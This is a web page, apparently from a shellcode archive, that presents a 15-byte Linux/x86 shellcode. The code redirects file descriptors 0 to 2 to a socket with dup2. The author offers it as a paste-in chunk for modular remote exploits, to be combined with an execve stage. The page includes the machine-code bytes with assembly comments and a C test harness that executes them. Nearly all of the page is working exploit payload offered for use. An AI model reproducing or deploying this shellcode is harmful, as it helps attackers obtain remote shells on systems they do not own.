<html><head><title>Linux/x86 - dup2(0,0); dup2(0,1); dup2(0,2); 15 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* dup2_loop-core.c by Charles Stevenson &lt;core@bokeoa.com&gt; 
 *
 * I made this as a chunk you can paste in to make modular remote
 * exploits.  I usually combine this with an execve as the second
 * stage of a read() jmp *%esp
 */
char hellcode[] = /* dup2(0,0); dup2(0,1); dup2(0,2); linux/x86 by core */
&quot;\x31\xc9&quot;               	// xor    %ecx,%ecx
&quot;\x56&quot;                   	// push   %esi
&quot;\x5b&quot;                   	// pop    %ebx
// loop:
&quot;\x6a\x3f&quot;               	// push   $0x3f
&quot;\x58&quot;                   	// pop    %eax
&quot;\xcd\x80&quot;               	// int    $0x80
&quot;\x41&quot;                   	// inc    %ecx
&quot;\x80\xf9\x03&quot;           	// cmp    $0x3,%cl
&quot;\x75\xf5&quot;               	// jne    80483e8 &lt;loop&gt;
;

int main(void)
{
  void (*shell)() = (void *)&amp;hellcode;
  printf(&quot;%d byte dup2(0,0); dup2(0,1); dup2(0,2); linux/x86 by core\n&quot;,
         strlen(hellcode));
  shell();
  return 0;
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
